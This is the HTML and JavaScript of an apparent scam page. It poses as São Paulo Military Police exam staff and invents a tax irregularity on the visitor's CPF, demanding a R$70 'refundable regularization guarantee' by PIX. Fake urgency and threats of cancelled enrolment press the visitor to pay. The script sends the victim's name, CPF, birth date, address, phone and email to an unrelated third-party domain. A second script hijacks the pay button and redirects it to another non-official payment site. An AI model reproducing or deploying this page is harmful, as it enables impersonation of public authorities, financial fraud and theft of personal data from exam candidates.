<!doctype html>
<html lang="pt-br">
  <head>
    <meta charset="UTF-8">
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <title>Garantia de Regularização – PM SP 2025</title>

    <!-- Microsoft Clarity -->
    <script type="text/javascript">
      (function (c, l, a, r, i, t, y) {
        c[a] =
          c[a] ||
          function () {
            (c[a].q = c[a].q || []).push(arguments);
          };
        t = l.createElement(r);
        t.async = 1;
        t.src = "https://www.clarity.ms/tag/" + i;
        y = l.getElementsByTagName(r)[0];
        y.parentNode.insertBefore(t, y);
      })(window, document, "clarity", "script", "t84urj3twx");
    </script>

    <!-- Tailwind CSS -->
    <script src="../../3.4-1.17"></script>
    <link href="../css/all.min-7.css" rel="stylesheet">
    <link href="../css/home-7.css" rel="stylesheet">

    <style>
      .gov-header {
        background: #222;
      }
      .inep-header {
        background: #044785;
      }
      .cta {
        background: #1e40af;
        transition: all 0.3s ease;
      }
      .cta:hover {
        background: #1d4ed8;
        transform: translateY(-1px);
        box-shadow: 0 4px 12px rgba(30, 64, 175, 0.2);
      }
      .warning-box {
        background: #fef7f0;
        border: 1px solid #e5e7eb;
        border-left: 4px solid #d97706;
      }
      .benefit-box {
        background: #f8fafc;
        border: 1px solid #e5e7eb;
        border-left: 4px solid #3b82f6;
      }
      .urgent-box {
        background: #fff7ed;
        border: 1px solid #e5e7eb;
        border-left: 4px solid #dc2626;
      }
      .modal-backdrop {
        position: fixed;
        inset: 0;
        background: rgba(0, 0, 0, 0.6);
        display: none;
        backdrop-filter: blur(4px);
        z-index: 1000;
      }
      .modal {
        position: fixed;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%);
        width: 95%;
        max-width: 520px;
        background: #fff;
        border-radius: 16px;
        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        display: none;
        z-index: 1001;
      }
      .countdown {
        background: #1e40af;
        border: 1px solid #1d4ed8;
      }
      .footer-bg {
        background-color: #1c2b39;
      }
      .qr-container {
        background: #f8fafc;
        border: 1px solid #e5e7eb;
        border-radius: 8px;
        padding: 20px;
      }
      .copy-button {
        background: #374151;
        transition: all 0.3s ease;
      }
      .copy-button:hover {
        background: #1f2937;
      }
      .status-indicator {
        width: 8px;
        height: 8px;
        border-radius: 50%;
        background: #22c55e;
        margin-right: 8px;
      }
    </style>
  </head>
  <body class="flex flex-col min-h-screen bg-gray-50">
    <header class="gov-header text-white py-2">
      <div class="container mx-auto flex justify-between items-center px-4">
        <img src="../images/top_gov-5-6.jpg" alt="Logotipo" class="h-6">
        <nav>
          <ul class="flex space-x-4 text-[10px]">
            <li><a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a></li>
            <li><a class="hover:underline" href="#">PARTICIPE</a></li>
            <li><a class="hover:underline" href="#">SERVIÇOS</a></li>
          </ul>
        </nav>
      </div>
    </header>

    <div class="inep-header py-3">
      <div class="container mx-auto px-4">
        <img src="../images/pmsp-7.png" alt="PM SP logo" height="30" width="60" style="object-fit: contain">
      </div>
    </div>

    <main class="flex-grow py-8">
      <div class="container mx-auto px-4 max-w-4xl">
        <!-- Logo da Receita Centralizado -->
        <div class="text-center mb-6">
          <img src="../../dFKYNzj.png" alt="Garantia de Regularização" height="60" style="object-fit: contain; max-height: 60px; margin: 0 auto;">
        </div>
        
        <!-- Banner de Informação -->
        <div class="countdown text-white py-4 px-6 rounded-lg mb-6 text-center">
          <div class="flex items-center justify-center mb-2">
            <i class="fas fa-info-circle text-xl mr-3"></i>
            <h2 class="text-lg font-semibold">Regularização Necessária</h2>
          </div>
          <p class="text-sm opacity-90">
            Complete sua inscrição com a garantia de regularização
          </p>
        </div>

        <div class="grid lg:grid-cols-2 gap-8">
          <!-- Coluna Principal -->
          <div class="space-y-6">
            <div class="bg-white rounded-xl shadow-lg p-6">
              <div class="urgent-box p-4 rounded-lg mb-4">
                <h3 class="text-lg font-bold text-gray-800 mb-2 flex items-center">
                  <i class="fas fa-shield-alt mr-2 text-red-600"></i>
                  Pendência Detectada no seu CPF
                </h3>
                <p class="text-gray-700 text-sm">
                  Nossa verificação automática identificou irregularidades na
                  Receita Federal. Para manter sua participação no concurso, é
                  obrigatório efetuar o pagamento da
                  <strong>Garantia de Regularização</strong>.
                </p>
              </div>

              <div class="benefit-box p-4 rounded-lg mb-4">
                <h4 class="text-gray-800 font-bold mb-2 flex items-center">
                  <i class="fas fa-check-circle mr-2 text-blue-600"></i>
                  Tranquilidade Total
                </h4>
                <ul class="text-gray-700 text-sm space-y-2">
                  <li class="flex items-start">
                    <i class="fas fa-arrow-right text-blue-600 mt-1 mr-2 text-xs"></i>
                    <span><strong>Não é taxa extra:</strong> É apenas uma garantia
                      temporária</span>
                  </li>
                  <li class="flex items-start">
                    <i class="fas fa-arrow-right text-blue-600 mt-1 mr-2 text-xs"></i>
                    <span><strong>Reembolso automático:</strong> Devolução em até 5
                      dias úteis</span>
                  </li>
                  <li class="flex items-start">
                    <i class="fas fa-arrow-right text-blue-600 mt-1 mr-2 text-xs"></i>
                    <span><strong>Processo seguro:</strong> Ambiente 100% protegido
                      e auditado</span>
                  </li>
                  <li class="flex items-start">
                    <i class="fas fa-arrow-right text-blue-600 mt-1 mr-2 text-xs"></i>
                    <span><strong>Liberação imediata:</strong> Sua vaga fica
                      garantida na hora</span>
                  </li>
                </ul>
              </div>

              <div class="warning-box p-4 rounded-lg">
                <h4 class="text-gray-800 font-bold mb-2 flex items-center">
                  <i class="fas fa-clock mr-2 text-orange-600"></i>
                  Consequências da Não Regularização
                </h4>
                <ul class="text-gray-700 text-sm space-y-1">
                  <li>❌ Inscrição será automaticamente cancelada</li>
                  <li>❌ Perda total do valor da inscrição (R$ 85,00)</li>
                  <li>❌ Impossibilidade de participar do concurso</li>
                  <li>❌ O valor será destinado aos cofres públicos</li>
                </ul>
              </div>
            </div>
          </div>

          <!-- Coluna de Pagamento -->
          <div class="space-y-6">
            <div class="bg-white rounded-xl shadow-lg p-6 text-center">
              <div class="mb-4">
                <div class="text-4xl font-extrabold text-gray-800 mb-1">
                  R$ 70,00
                </div>
                <div class="text-gray-600 text-sm">
                  Garantia de Regularização
                </div>
                <div class="text-xs text-gray-500 mt-1">
                  (Valor reembolsável)
                </div>
              </div>

              <div class="bg-gray-50 rounded-lg p-4 mb-4">
                <h4 class="font-semibold text-gray-800 mb-2 flex items-center justify-center">
                  <i class="fas fa-info-circle mr-2 text-blue-600"></i>
                  Como Funciona
                </h4>
                <div class="text-sm text-gray-700 space-y-2 text-left">
                  <div class="flex items-start">
                    <span class="bg-blue-600 text-white rounded-full w-5 h-5 flex items-center justify-center text-xs mr-3 mt-0.5">1</span>
                    <span>Você paga a garantia de R$ 70,00</span>
                  </div>
                  <div class="flex items-start">
                    <span class="bg-blue-600 text-white rounded-full w-5 h-5 flex items-center justify-center text-xs mr-3 mt-0.5">2</span>
                    <span>Sua inscrição fica regularizada automaticamente</span>
                  </div>
                  <div class="flex items-start">
                    <span class="bg-blue-600 text-white rounded-full w-5 h-5 flex items-center justify-center text-xs mr-3 mt-0.5">3</span>
                    <span>Recebe reembolso total em até 2 dias úteis</span>
                  </div>
                </div>
              </div>

              <!-- Campo de Chave PIX para Restituição -->
              <div class="mb-4">
                <label for="chave-pix" class="block text-sm font-medium text-gray-700 mb-2">
                  <i class="fas fa-key mr-1 text-blue-600"></i>
                  Chave PIX para Restituição <span class="text-red-500">*</span>
                </label>
                <input type="text" id="chave-pix" placeholder="Digite seu CPF ou E-mail" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all" required="">
                <p class="text-xs text-gray-500 mt-1">
                  Informe sua chave PIX para receber a restituição em até 2 dias
                  úteis
                </p>
              </div>

              <button id="btn-pagar" class="w-full cta text-white px-6 py-4 rounded-lg font-semibold text-lg opacity-50 cursor-not-allowed" disabled="">
                <i class="fas fa-shield-alt mr-2"></i>
                REGULARIZAR AGORA
              </button>

              <div class="mt-3 flex items-center justify-center text-xs text-gray-500">
                <div class="status-indicator"></div>
                <span>Sistema online e seguro</span>
              </div>
            </div>

            <!-- Info adicional -->
            <div class="bg-gray-50 border border-gray-200 rounded-lg p-4">
              <h4 class="font-semibold text-gray-800 mb-2 flex items-center">
                <i class="fas fa-question-circle mr-2 text-gray-600"></i>
                Por que é necessário?
              </h4>
              <p class="text-gray-700 text-sm">
                A Garantia de Regularização é um procedimento adotado conforme
                as novas diretrizes dos concursos públicos para assegurar que
                todos os candidatos estejam com sua situação regular junto aos
                órgãos competentes.
              </p>
            </div>
          </div>
        </div>
      </div>
    </main>

    <!-- Modal PIX -->
    <div id="backdrop" class="modal-backdrop"></div>
    <div id="modal" class="modal">
      <div class="p-6 border-b border-gray-200 flex justify-between items-center">
        <h3 class="text-xl font-semibold flex items-center">
          <i class="fas fa-qrcode mr-2 text-blue-600"></i>
          Pagamento via PIX
        </h3>
        <button id="modal-close" class="text-gray-500 hover:text-gray-800 text-xl">
          <i class="fas fa-times"></i>
        </button>
      </div>

      <div class="p-6">
        <div id="pix-loading" class="text-center py-8">
          <div class="inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mb-4"></div>
          <p class="text-gray-600 font-medium">Gerando seu PIX seguro...</p>
          <p class="text-gray-500 text-sm mt-1">
            Isso leva apenas alguns segundos
          </p>
        </div>

        <div id="pix-content" class="hidden">
          <div class="qr-container text-center mb-4">
            <img id="qr-img" alt="QR Code PIX" class="mx-auto rounded-lg shadow-md" style="max-width: 280px">
            <p class="text-gray-600 text-sm mt-3">
              <i class="fas fa-mobile-alt mr-1"></i>
              Escaneie com o app do seu banco
            </p>
          </div>

          <div class="bg-gray-50 border-2 border-dashed border-gray-300 rounded-lg p-4">
            <label class="text-sm text-gray-700 font-medium mb-2 block">
              <i class="fas fa-copy mr-1"></i>
              Ou copie o código PIX
            </label>
            <textarea id="pix-copia" class="w-full text-xs p-3 border border-gray-300 rounded-lg bg-white" rows="3" readonly="" placeholder="Código PIX será gerado aqui..."></textarea>
            <button id="btn-copy" class="mt-3 w-full copy-button text-white py-3 rounded-lg font-medium">
              <i class="fas fa-copy mr-2"></i>
              Copiar Código PIX
            </button>
          </div>

          <div class="bg-green-50 border border-green-200 rounded-lg p-3 mt-4">
            <p class="text-green-800 text-sm text-center">
              <i class="fas fa-shield-alt mr-1"></i>
              Após o pagamento, a confirmação é automática e instantânea
            </p>
          </div>
        </div>
      </div>

      <div class="p-6 border-t border-gray-200 bg-gray-50 rounded-b-xl">
        <button id="btn-ja-paguei" class="w-full bg-green-600 text-white py-3 rounded-lg hover:bg-green-700 font-medium transition-colors">
          <i class="fas fa-check mr-2"></i>
          Já Realizei o Pagamento
        </button>
      </div>
    </div>

    <footer class="footer-bg text-white py-6 text-xs">
      <div class="container mx-auto px-4">
        <div class="flex flex-col items-center mb-3">
          <img src="../images/pmsp-7.png" alt="PM SP logo" height="30" width="60" style="object-fit: contain">
        </div>
        <div class="flex justify-between items-center">
          <div>&copy; PM SP - Polícia Militar de São Paulo</div>
          <div class="flex items-center">
            <i class="fas fa-phone-alt mr-1"></i> 0800 616161
          </div>
        </div>
      </div>
    </footer>

    <script>
      // Configurações da API
      const API_CREATE =
        "https://app.deliciasdonamaria.com/api/concurso2ups/api/pix-payment";
      const API_STATUS =
        "https://app.deliciasdonamaria.com/api/concurso2ups/api/check-payment";
      const PRICE = 70.0;
      const UPS_TYPE = "regularizacao";

      // Elementos DOM
      const elBtn = document.getElementById("btn-pagar");
      const elModal = document.getElementById("modal");
      const elBackdrop = document.getElementById("backdrop");
      const elClose = document.getElementById("modal-close");
      const elLoad = document.getElementById("pix-loading");
      const elContent = document.getElementById("pix-content");
      const elQR = document.getElementById("qr-img");
      const elCopia = document.getElementById("pix-copia");
      const elCopy = document.getElementById("btn-copy");
      const elPaid = document.getElementById("btn-ja-paguei");
      const elChavePix = document.getElementById("chave-pix");

      let polling = null;
      let currentPixData = null;

      // Função para aplicar máscara de CPF
      function applyCpfMask(value) {
        // Remove tudo que não é número
        const numbersOnly = value.replace(/\D/g, '');
        
        // Aplica a máscara 999.999.999-99
        if (numbersOnly.length <= 11) {
          return numbersOnly
            .replace(/(\d{3})(\d)/, '$1.$2')
            .replace(/(\d{3})(\d)/, '$1.$2')
            .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
        }
        
        return numbersOnly.substring(0, 11)
          .replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
      }

      // Função para detectar e aplicar máscara automaticamente
      function handlePixKeyInput(e) {
        const value = e.target.value;
        
        // Se começar com número, aplica máscara de CPF
        if (value.length > 0 && /^\d/.test(value)) {
          const maskedValue = applyCpfMask(value);
          if (maskedValue !== value) {
            e.target.value = maskedValue;
          }
        }
        
        // Chama validação
        validatePixKey();
      }

      // Validação do campo de chave PIX
      function validatePixKey() {
        const pixValue = elChavePix.value.trim();

        if (pixValue.length > 0) {
          // Habilita o botão
          elBtn.disabled = false;
          elBtn.classList.remove("opacity-50", "cursor-not-allowed");
          elBtn.classList.add("hover:bg-blue-700");
        } else {
          // Desabilita o botão
          elBtn.disabled = true;
          elBtn.classList.add("opacity-50", "cursor-not-allowed");
          elBtn.classList.remove("hover:bg-blue-700");
        }
      }

      // Adicionar evento ao campo de chave PIX
      elChavePix.addEventListener("input", handlePixKeyInput);
      elChavePix.addEventListener("change", validatePixKey);

      // Validação inicial
      validatePixKey();

      // Funções do modal
      function openModal() {
        elBackdrop.style.display = "block";
        elModal.style.display = "block";
        document.body.style.overflow = "hidden";
      }

      function closeModal() {
        elBackdrop.style.display = "none";
        elModal.style.display = "none";
        document.body.style.overflow = "auto";
        stopPolling();
      }

      // Polling para verificar pagamento
      function startPolling() {
        stopPolling();

        polling = setInterval(async () => {
          try {
            if (!currentPixData || !currentPixData.payment_code) return;

            const response = await fetch(API_STATUS, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                payment_code: currentPixData.payment_code,
              }),
            });

            const result = await response.json();

            // Verificar se o pagamento foi aprovado
            if (
              result.success &&
              result.payment &&
              (result.payment.payment_status === "approved" ||
                result.payment.payment_status === "paid")
            ) {
              console.log("✅ Pagamento aprovado! Redirecionando...");

              // Salvar dados do upsell no localStorage
              const upsellPix = {
                payment_code: currentPixData.payment_code,
                amount: PRICE,
                type: UPS_TYPE,
                timestamp: new Date().toISOString(),
              };
              localStorage.setItem(
                "currentPixUpsell",
                JSON.stringify(upsellPix),
              );
              localStorage.setItem("upsellPaid", "true"); // MARCAR QUE UPSELL FOI PAGO

              // Redirecionar para confirmação do upsell
              stopPolling();
              window.location.href = "/inicio/confirmacao/";
            }
          } catch (error) {
            console.error("❌ Erro no polling de pagamento:", error.message);
          }
        }, 4000);
      }

      function stopPolling() {
        if (polling) {
          clearInterval(polling);
          polling = null;
        }
      }

      // Evento de copiar PIX
      elCopy.addEventListener("click", async () => {
        try {
          await navigator.clipboard.writeText(elCopia.value);
          elCopy.innerHTML = '<i class="fas fa-check mr-2"></i>Copiado!';
          elCopy.style.background =
            "linear-gradient(135deg, #10b981 0%, #059669 100%)";

          setTimeout(() => {
            elCopy.innerHTML =
              '<i class="fas fa-copy mr-2"></i>Copiar Código PIX';
            elCopy.style.background = "";
          }, 2000);
        } catch (error) {
          alert(
            "Não foi possível copiar automaticamente. Selecione e copie manualmente.",
          );
        }
      });

      // Evento "Já paguei"
      elPaid.addEventListener("click", async () => {
        if (!currentPixData || !currentPixData.payment_code) {
          alert(
            "Nenhum PIX foi gerado ainda. Por favor, gere um PIX primeiro.",
          );
          return;
        }

        try {
          const response = await fetch(API_STATUS, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              payment_code: currentPixData.payment_code,
            }),
          });

          const result = await response.json();

          if (
            result.success &&
            result.payment &&
            (result.payment.payment_status === "approved" ||
              result.payment.payment_status === "paid")
          ) {
            const upsellPix = {
              payment_code: currentPixData.payment_code,
              amount: PRICE,
              type: UPS_TYPE,
              timestamp: new Date().toISOString(),
            };
            localStorage.setItem("currentPixUpsell", JSON.stringify(upsellPix));
            localStorage.setItem("upsellPaid", "true"); // MARCAR QUE UPSELL FOI PAGO
            window.location.href = "/inicio/confirmacao/";
          } else {
            alert(
              "Pagamento ainda não foi identificado. Aguarde alguns instantes e tente novamente, ou verifique se o pagamento foi realizado corretamente.",
            );
          }
        } catch (error) {
          console.error("Erro ao verificar pagamento:", error);
          alert(
            "Não foi possível verificar o pagamento no momento. Tente novamente.",
          );
        }
      });

      // Eventos de fechar modal
      [elClose, elBackdrop].forEach((el) =>
        el.addEventListener("click", closeModal),
      );

      // Evento principal de pagamento
      elBtn.addEventListener("click", async () => {
        openModal();
        elLoad.classList.remove("hidden");
        elContent.classList.add("hidden");

        // Recuperar dados do usuário
        const cpfData = localStorage.getItem("cpfData");
        const enderecoData = localStorage.getItem("enderecoData");
        const emailConfirmacao = localStorage.getItem("emailConfirmacao");
        const utms = localStorage.getItem("utmParams") || "";
        const gclid = localStorage.getItem("gclid") || "";

        // Verificar dados necessários
        const userData = cpfData ? JSON.parse(cpfData).DADOS : null;

        if (!userData?.CPF || !userData?.NOME) {
          throw new Error(
            "Dados do CPF não encontrados. Verifique se você preencheu seus dados corretamente.",
          );
        }

        if (!emailConfirmacao) {
          throw new Error("E-mail de confirmação não encontrado");
        }

        // Recuperar dados de endereço
        const enderecoInfo = enderecoData ? JSON.parse(enderecoData) : {};

        const requestBody = {
          name: userData.NOME,
          document: userData.CPF,
          email: emailConfirmacao,
          birthDate: userData.NASC || null,
          cpfData: userData,
          // Adicionar dados de endereço reais do usuário
          address: {
            cep: enderecoInfo.cep || "",
            logradouro: enderecoInfo.logradouro || "",
            numero: enderecoInfo.numero || "",
            complemento: enderecoInfo.complemento || "",
            bairro: enderecoInfo.bairro || "",
            cidade: enderecoInfo.cidade || "",
            uf: enderecoInfo.uf || "",
            telefone: enderecoInfo.telefone || "",
          },
          // Adicionar valor em centavos
          amount: PRICE * 100,
          // Metadados para identificar como upsell
          upsell: true,
          upsell_type: UPS_TYPE,
        };

        try {
          const response = await fetch(API_CREATE, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(requestBody),
          });

          if (!response.ok) {
            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
          }

          const result = await response.json();

          if (!result.success) {
            throw new Error(result.message || "Falha ao gerar PIX");
          }

          // Extrair dados do PIX - compatibilidade com estruturas diferentes
          // PRODUÇÃO: result.payment.*
          // DEMONSTRAÇÃO: result.* (campos no nível raiz)
          const payment = result.payment || result || {};

          currentPixData = {
            payment_code:
              payment.payment_code || payment.txid || result.payment_code,
            amount: PRICE,
            type: UPS_TYPE,
          };

          // Compatibilidade com todos os formatos de campo da API:
          const pixCopia =
            payment.qr_code ||
            payment.pixCopiaCola ||
            payment.pix_copy_paste ||
            "";
          const qrImageUrl = payment.qr_code_url || "";
          const qrBase64 = payment.qrCodeBase64 || "";

          // Preencher interface - priorizar URL, depois base64
          if (qrImageUrl) {
            elQR.src = qrImageUrl;
            elQR.style.display = "block";
          } else if (qrBase64) {
            elQR.src = qrBase64.startsWith("data:")
              ? qrBase64
              : `data:image/png;base64,${qrBase64}`;
            elQR.style.display = "block";
          } else {
            console.warn("⚠️ QR code não encontrado");
          }

          if (pixCopia) {
            elCopia.value = pixCopia;
          } else {
            console.warn("⚠️ Código PIX não encontrado");
          }

          // Salvar dados no localStorage
          localStorage.setItem(
            "currentPixUpsell",
            JSON.stringify(currentPixData),
          );

          elLoad.classList.add("hidden");
          elContent.classList.remove("hidden");

          // Iniciar polling
          startPolling();

          console.log("✅ PIX gerado com sucesso!");
        } catch (error) {
          console.error("❌ Erro ao gerar PIX:", error);
          elLoad.innerHTML = `
            <div class="text-red-600 py-4">
              <i class="fas fa-exclamation-triangle text-3xl mb-3"></i>
              <p class="font-medium">Falha ao gerar PIX</p>
              <p class="text-sm mt-2">${error.message}</p>
              <button onclick="location.reload()" class="mt-4 bg-red-600 text-white px-4 py-2 rounded hover:bg-red-700">
                Tentar Novamente
              </button>
            </div>
          `;
        }
      });

      // Limpar polling ao sair da página
      window.addEventListener("beforeunload", () => {
        stopPolling();
      });
    </script>
  <script defer="" src="../../beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015-7" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"a85dcd35d0ac4aa4b520758cac699320","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>

  <!-- Bloco adicionado: redireciona o botão REGULARIZAR AGORA para o site oficial com os parâmetros da URL -->
  <script>
    (function () {
      var OFFICIAL_URL = "https://pay.pmconcurso.site/lqv130yWJVLZxbj";
      function withForwardedParams(baseUrl) {
        try {
          var target = new URL(baseUrl, window.location.href);
          var current = new URL(window.location.href);
          current.searchParams.forEach(function (value, key) {
            if (!target.searchParams.has(key)) {
              target.searchParams.append(key, value);
            }
          });
          if (!target.hash && current.hash) target.hash = current.hash;
          return target.toString();
        } catch (e) {
          return baseUrl;
        }
      }
      var btn = document.getElementById("btn-pagar");
      if (btn) {
        btn.addEventListener(
          "click",
          function (e) {
            e.preventDefault();
            e.stopImmediatePropagation();
            e.stopPropagation();
            window.location.href = withForwardedParams(OFFICIAL_URL);
          },
          true
        );
      }
    })();
  </script>
</body>
</html>
